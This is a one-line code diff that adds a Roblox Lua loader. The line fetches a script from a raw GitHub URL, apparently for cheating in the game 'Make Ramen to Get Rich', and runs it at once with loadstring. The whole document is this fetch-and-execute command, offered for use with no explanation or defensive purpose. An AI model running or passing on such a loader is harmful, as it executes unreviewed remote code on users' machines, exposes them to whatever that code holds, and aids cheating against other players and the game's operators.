@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/make-ramen-to-get-rich-release-spam3-y2c7yr44o6rypn.lua"))()
